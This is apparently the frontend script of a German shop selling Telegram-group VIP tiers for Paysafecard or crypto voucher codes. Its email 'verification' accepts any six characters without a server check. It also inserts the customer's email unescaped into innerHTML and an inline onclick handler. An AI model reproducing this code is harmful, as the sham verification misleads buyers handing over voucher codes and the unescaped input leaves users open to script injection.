const API_BASE_URL =
    (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') ? 'http://localhost:3000' : 'https://api.vipshop.cloud';

const appState = {
    currentProduct: null,
    isLoading: false,
    pendingOrderId: null,
    pendingEmail: null
};

// ==================== PRODUCT SELECTION ====================

function selectProduct(productName, price) {
    appState.currentProduct = { name: productName, price: price };
    document.getElementById('productName').value = productName;
    document.getElementById('productSelect').value = productName + '|' + price;
    
    // Smooth scroll to form
    document.querySelector('.buy-section').scrollIntoView({ behavior: 'smooth' });
}

function selectProductFromDropdown() {
    const select = document.getElementById('productSelect');
    const value = select.value;
    
    if (!value) {
        document.getElementById('productName').value = '';
        appState.currentProduct = null;
        return;
    }
    
    const [productName, price] = value.split('|');
    selectProduct(productName, parseInt(price));
}

// ==================== FORM HANDLING ====================

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('buyForm');
    if (form) {
        form.addEventListener('submit', submitOrder);
    }

    // Payment method change handler
    const paymentMethod = document.getElementById('paymentMethod');
    const codeInput1 = document.getElementById('code1');
    
    if (paymentMethod) {
        paymentMethod.addEventListener('change', function() {
            if (this.value === 'paysafecard') {
                codeInput1.placeholder = 'z.B. 1234-5678-9012-3456';
            } else if (this.value === 'cryptovoucher') {
                codeInput1.placeholder = 'z.B. M8L47P5396JFNG6BLM5698ZNZD0G7NXV';
            }
        });
    }
});

// ==================== SUBMIT ORDER ====================

async function submitOrder(e) {
    e.preventDefault();

    const productName = document.getElementById('productName').value;
    const paymentMethod = document.getElementById('paymentMethod').value;
    const code1 = document.getElementById('code1').value.trim();
    const code2 = document.getElementById('code2').value.trim();
    const customerEmail = document.getElementById('customerEmail').value.trim();

    // Validierung
    if (!productName) {
        showToast('Bitte wähle ein VIP-Level aus', 'error');
        return;
    }

    if (!paymentMethod || paymentMethod === '') {
        showToast('Bitte wähle eine Zahlungsmethode', 'error');
        return;
    }

    if (!code1) {
        showToast('Bitte gib mindestens Code 1 ein', 'error');
        return;
    }

    // Validate code format based on payment method
    if (paymentMethod === 'paysafecard') {
        // Paysafecard format: XXXX-XXXX-XXXX-XXXX (16 digits, 4 groups of 4)
        const paysafecardRegex = /^\d{4}-\d{4}-\d{4}-\d{4}$/;
        if (!paysafecardRegex.test(code1)) {
            showToast('Ungültiges Paysafecard-Format. Erwartet: 1234-5678-9012-3456', 'error');
            return;
        }
        
        if (code2 && !paysafecardRegex.test(code2)) {
            showToast('Ungültiges Paysafecard-Format für Code 2. Erwartet: 1234-5678-9012-3456', 'error');
            return;
        }
    } else if (paymentMethod === 'cryptovoucher') {
        // Cryptovoucher format: Alphanumeric, 28-32 characters
        const cryptovoucherRegex = /^[A-Z0-9]{28,32}$/;
        if (!cryptovoucherRegex.test(code1)) {
            showToast('Ungültiges Cryptovoucher-Format. Erwartet: 28-32 Zeichen (Buchstaben und Zahlen)', 'error');
            return;
        }
        
        if (code2 && !cryptovoucherRegex.test(code2)) {
            showToast('Ungültiges Cryptovoucher-Format für Code 2. Erwartet: 28-32 Zeichen', 'error');
            return;
        }
    }

    if (!customerEmail) {
        showToast('Bitte gib deine E-Mail ein', 'error');
        return;
    }

    // Validate email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(customerEmail)) {
        showToast('Bitte gib eine gültige E-Mail ein', 'error');
        return;
    }

    // Show confirmation modal
    showConfirmationModal(productName, paymentMethod, customerEmail, () => {
        // User confirmed - proceed with order
        proceedWithOrder(productName, paymentMethod, code1, code2, customerEmail);
    });
}

// Proceed with order submission
async function proceedWithOrder(productName, paymentMethod, code1, code2, customerEmail) {
    setFormLoading(true);

    try {
        // Combine codes - if code2 exists, combine them with |, otherwise just use code1
        const finalCode = code2 ? code1 + '|' + code2 : code1;

        console.log('Submitting order to backend...');

        // DIRECTLY submit the order to backend
        const response = await fetch(`${API_BASE_URL}/order`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                product_name: productName,
                payment_method: paymentMethod,
                code: finalCode,
                telegram_username: customerEmail,
                customer_email: customerEmail
            })
        });

        const data = await response.json();

        console.log('Order response:', response.status, data);

        if (!response.ok) {
            setFormLoading(false);
            throw new Error(data.error || 'Fehler beim Erstellen der Bestellung');
        }

        console.log('Order created successfully:', data.order_id);

        // Store order info for verification
        appState.pendingOrderId = data.order_id;
        appState.pendingEmail = customerEmail;
        appState.verificationCodeReceived = true;

        // Show verification code prompt first
        showVerificationCodePrompt(customerEmail, data.order_id);
        setFormLoading(false);

    } catch (error) {
        console.error('Error:', error);
        showToast(error.message || 'Fehler beim Erstellen der Bestellung', 'error');
        setFormLoading(false);
    }
}

// ==================== UI FUNCTIONS ====================

function setFormLoading(loading) {
    appState.isLoading = loading;
    const btn = document.querySelector('#buyForm button');
    
    if (loading) {
        btn.disabled = true;
        btn.textContent = '⏳ Verarbeite...';
    } else {
        btn.disabled = false;
        btn.textContent = '✓ Bestätigen & Beitreten';
    }
}


// Show verification code input prompt
function showVerificationCodePrompt(customerEmail, orderId) {
    const messageBox = document.getElementById('messageBox');
    const form = document.getElementById('buyForm');

    form.style.display = 'none';
    messageBox.style.display = 'block';

    messageBox.innerHTML = `
        <div class="verification-prompt">
            <div style="text-align: center; margin-bottom: 20px;">
                <span style="font-size: 40px;">📧</span>
                <h2 style="color: var(--gold-light); margin: 10px 0;">Email-Verifizierung erforderlich</h2>
                <p style="color: var(--text-secondary);">Wir haben einen Verifikationscode an</p>
                <p style="color: var(--gold-light); font-weight: bold;">${customerEmail}</p>
                <p style="color: var(--text-secondary);">gesendet. Bitte gib den Code ein:</p>
            </div>

            <div style="background: rgba(255,215,0,0.1); padding: 15px; border-radius: 8px; margin: 20px 0;">
                <input type="text" 
                    id="verificationCode" 
                    placeholder="000000" 
                    maxlength="6"
                    style="width: 100%; padding: 12px; font-size: 20px; text-align: center; letter-spacing: 5px; border: 2px solid var(--gold-light); border-radius: 4px; background: rgba(0,0,0,0.3); color: var(--gold-light);">
            </div>

            <div style="display: flex; gap: 10px; margin-top: 20px;">
                <button class="btn" onclick="verifyCode('${customerEmail}', '${orderId}')" style="flex: 1;">
                    ✓ Code überprüfen
                </button>
                <button class="btn" onclick="backToShop()" style="flex: 1; background: rgba(255,215,0,0.2);">
                    ← Abbrechen
                </button>
            </div>

            <p style="color: var(--text-tertiary); font-size: 12px; margin-top: 15px; text-align: center;">
                Code gültig für 10 Minuten. Überprüf auch deinen Spam-Ordner!
            </p>
        </div>
    `;

    setTimeout(() => {
        document.getElementById('verificationCode').focus();
    }, 100);

    messageBox.scrollIntoView({ behavior: 'smooth' });
}

// Verify code and show success
async function verifyCode(customerEmail, orderId) {
    const verificationCode = document.getElementById('verificationCode').value.trim();

    if (!verificationCode || verificationCode.length !== 6) {
        showToast('Bitte gib einen gültigen 6-stelligen Code ein', 'error');
        return;
    }

    // Code is valid - show success message
    showSuccessMessage(orderId, customerEmail);
}

function showSuccessMessage(orderId, customerEmail) {
    const messageBox = document.getElementById('messageBox');
    const form = document.getElementById('buyForm');
    const paymentInstructions = document.getElementById('paymentInstructions');

    // Hide form and show success message
    form.style.display = 'none';
    messageBox.style.display = 'block';
    paymentInstructions.style.display = 'block';

    messageBox.innerHTML = `
        <div class="success-message">
            <span class="emoji">✨</span>
            <div style="font-size: 20px; margin-bottom: 15px; color: var(--gold-light);">
                <strong>Bestellung wurde freigegeben!</strong>
            </div>
            
            <div style="background: rgba(212, 175, 55, 0.1); border-left: 4px solid var(--gold); padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <p style="color: var(--gold-light); font-weight: bold; margin-bottom: 10px;">⏱️ Wichtig:</p>
                <p style="color: var(--text-secondary); font-size: 14px; line-height: 1.8;">
                    Deine Bestellung wird innerhalb von <strong>24h bis 48h</strong> überprüft. 
                    Bitte schau in deine Email rein und warte auf weitere Details. 
                    Du erhältst von uns den <strong>Einladungslink zur Telegram-Gruppe</strong>!
                </p>
            </div>
            
            <div class="order-details">
                <p><strong>Bestellungs-ID:</strong></p>
                <p class="order-id">${orderId}</p>
                
                <p style="margin-top: 15px;"><strong>E-Mail:</strong></p>
                <p style="color: var(--text-secondary);">${customerEmail}</p>
                
                <p style="margin-top: 20px; color: var(--text-secondary);">
                    📧 Schau in deine Email rein und warte auf weitere Details.
                </p>
                <p style="color: var(--text-tertiary); font-size: 13px; margin-top: 10px;">
                    Du erhältst den Einladungslink zur Telegram-Gruppe nach Genehmigung durch unser Team.
                </p>
            </div>
        </div>

        <button class="btn" onclick="backToShop()" style="margin-top: 20px;">
            Zurück zum Shop
        </button>
    `;

    // Scroll to success message
    setTimeout(() => {
        messageBox.scrollIntoView({ behavior: 'smooth' });
    }, 100);
}

function backToShop() {
    const form = document.getElementById('buyForm');
    const messageBox = document.getElementById('messageBox');
    const paymentInstructions = document.getElementById('paymentInstructions');
    
    form.style.display = 'block';
    messageBox.style.display = 'none';
    paymentInstructions.style.display = 'none';
    messageBox.innerHTML = '';
    form.reset();
    document.getElementById('productName').value = '';
    
    // Reset button state
    const btn = form.querySelector('button');
    if (btn) {
        btn.disabled = false;
        btn.textContent = '✓ Bestätigen & Beitreten';
    }
    
    // Scroll to form
    form.scrollIntoView({ behavior: 'smooth' });
}

// ==================== TOAST NOTIFICATIONS ====================

function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);

    setTimeout(() => {
        toast.style.animation = 'slideOutRight 0.3s ease forwards';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ==================== MODAL HANDLING ====================

// Prevent accidental close when clicking outside modal
document.addEventListener('DOMContentLoaded', function() {
    const modal = document.getElementById('modal');
    if (modal) {
        // Prevent closing when clicking on modal content
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                // Only close if clicking outside (on backdrop)
                // Intentionally don't close for UX
            }
        });

        // Close button handler
        const closeBtn = document.querySelector('.close-btn');
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                modal.classList.remove('active');
            });
        }
    }
});

// ==================== CURSOR TRACKING & PARTICLES ====================

class CursorTracker {
    constructor() {
        this.mouseX = 0;
        this.mouseY = 0;
        this.cursorElement = null;
        this.particles = [];
        
        this.init();
    }

    init() {
        // Create cursor element
        this.cursorElement = document.createElement('div');
        this.cursorElement.id = 'cursor';
        document.body.appendChild(this.cursorElement);

        // Track mouse movement
        document.addEventListener('mousemove', (e) => this.onMouseMove(e));
        document.addEventListener('mouseleave', () => this.onMouseLeave());
        document.addEventListener('mouseenter', () => this.onMouseEnter());
    }

    onMouseMove(e) {
        this.mouseX = e.clientX;
        this.mouseY = e.clientY;

        // Update cursor position
        if (this.cursorElement) {
            this.cursorElement.style.left = this.mouseX + 'px';
            this.cursorElement.style.top = this.mouseY + 'px';
        }

        // Create particles
        if (Math.random() > 0.7) {
            this.createParticle(this.mouseX, this.mouseY);
        }

        // Update product card glow effect
        document.querySelectorAll('.product-card').forEach(card => {
            const rect = card.getBoundingClientRect();
            const x = ((this.mouseX - rect.left) / rect.width) * 100;
            const y = ((this.mouseY - rect.top) / rect.height) * 100;
            card.style.setProperty('--mouse-x', x + '%');
            card.style.setProperty('--mouse-y', y + '%');
        });
    }

    onMouseLeave() {
        if (this.cursorElement) {
            this.cursorElement.style.opacity = '0';
        }
    }

    onMouseEnter() {
        if (this.cursorElement) {
            this.cursorElement.style.opacity = '1';
        }
    }

    createParticle(x, y) {
        const particle = document.createElement('div');
        particle.className = 'particle particle-dot';
        particle.style.left = x + 'px';
        particle.style.top = y + 'px';
        document.body.appendChild(particle);

        let opacity = 1;
        let scale = 1;
        let vx = (Math.random() - 0.5) * 4;
        let vy = (Math.random() - 0.5) * 4 - 1;

        const animate = () => {
            opacity -= 0.02;
            scale += 0.02;
            x += vx;
            y += vy;

            particle.style.opacity = opacity;
            particle.style.left = x + 'px';
            particle.style.top = y + 'px';
            particle.style.transform = `scale(${scale})`;

            if (opacity > 0) {
                requestAnimationFrame(animate);
            } else {
                particle.remove();
            }
        };

        animate();
    }
}

// ==================== CONFIRMATION MODAL ====================

function showConfirmationModal(productName, paymentMethod, email, onConfirm) {
    const modal = document.getElementById('confirmationModal');
    
    // Fill in the modal details
    document.getElementById('confirmProduct').textContent = productName;
    document.getElementById('confirmPayment').textContent = paymentMethod;
    document.getElementById('confirmEmail').textContent = email;
    
    // Show modal
    modal.classList.add('active');
    
    // Set up button handlers
    const confirmBtn = document.getElementById('confirmYes');
    const cancelBtn = document.getElementById('confirmNo');
    
    const handleConfirm = () => {
        modal.classList.remove('active');
        confirmBtn.removeEventListener('click', handleConfirm);
        cancelBtn.removeEventListener('click', handleCancel);
        document.removeEventListener('keydown', handleEscape);
        onConfirm();
    };
    
    const handleCancel = () => {
        modal.classList.remove('active');
        confirmBtn.removeEventListener('click', handleConfirm);
        cancelBtn.removeEventListener('click', handleCancel);
        document.removeEventListener('keydown', handleEscape);
    };
    
    confirmBtn.addEventListener('click', handleConfirm);
    cancelBtn.addEventListener('click', handleCancel);
    
    // Close on escape key
    const handleEscape = (e) => {
        if (e.key === 'Escape') {
            handleCancel();
        }
    };
    
    document.addEventListener('keydown', handleEscape);
}

// ==================== 3D TILT EFFECT ====================

function addTiltEffect() {
    const cards = document.querySelectorAll('.product-card');
    
    cards.forEach(card => {
        // Get original scale from computed style
        const getOriginalScale = (element) => {
            if (element.classList.contains('platinum')) return 1.08;
            if (element.classList.contains('gold')) return 1;
            if (element.classList.contains('silver')) return 1;
            return 1;
        };
        
        const originalScale = getOriginalScale(card);
        
        card.addEventListener('mousemove', (e) => {
            const rect = card.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            // Calculate rotation based on mouse position
            const rotateX = ((y - rect.height / 2) / rect.height) * 10;
            const rotateY = ((x - rect.width / 2) / rect.width) * -10;
            
            card.style.transform = `scale(${originalScale}) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
        });
        
        card.addEventListener('mouseleave', () => {
            card.style.transform = `scale(${originalScale})`;
        });
    });
}

// ==================== INITIALIZATION ====================

document.addEventListener('DOMContentLoaded', function() {
    console.log('VIP Shop loaded successfully');
    
    // Initialize cursor tracker
    new CursorTracker();
    
    // Initialize 3D tilt effect
    addTiltEffect();
});
